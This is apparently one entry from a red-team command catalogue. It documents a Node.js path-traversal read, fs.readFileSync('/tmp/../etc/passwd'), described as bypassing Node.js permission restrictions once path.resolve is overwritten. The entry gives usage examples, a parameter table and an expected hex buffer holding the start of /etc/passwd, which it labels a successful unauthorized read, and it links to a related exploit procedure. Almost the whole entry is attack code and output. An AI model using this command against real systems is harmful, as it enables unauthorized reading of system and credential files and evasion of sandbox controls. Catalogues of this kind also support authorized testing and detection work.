---
data: fs.readFileSync('/tmp/../etc/passwd')
tags:
  - file-read
  - traversal
type: command
output: >-
  <Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a 2f 72 6f 6f 74 3a 2f
  62 69 6e 2f 62 61 73 68 0a 64 61 65 6d 6f 6e 3a 78 3a 31 3a 31 3a 64 61 65 6d
  6f 6e 3a 2f 75 73 72 2f 73 62 69 6e 2f 6e 6f 6c 6f 67 69 6e 0a ... 3174 more
  bytes>
executor: javascript
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.385Z'
id: 3fbee4d5-97c0-4ec2-b99b-e7bbaacb3381
verified: false
validated: true
submitted: true
---
# readfile-traversal

## Command

```javascript
fs.readFileSync('/tmp/../etc/passwd')
```

## Description

Reads a file using fs.readFileSync with a path traversal sequence, bypassing Node.js permission restrictions when path.resolve is overwritten.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `/tmp/../etc/passwd` | Path with traversal to target file | Yes |

## Examples

### Basic Usage

```javascript
fs.readFileSync('/tmp/../etc/passwd');
```

### Advanced Usage

```javascript
const content = fs.readFileSync('/tmp/../etc/passwd', 'utf8'); console.log(content);
```

## Expected Output

Buffer of file contents: <Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a ... > indicating successful unauthorized read.

## Related

- [[commands/overwrite-path-resolve]]
- [[procedures/Exploit-Path-Traversal-for-File-Read]]
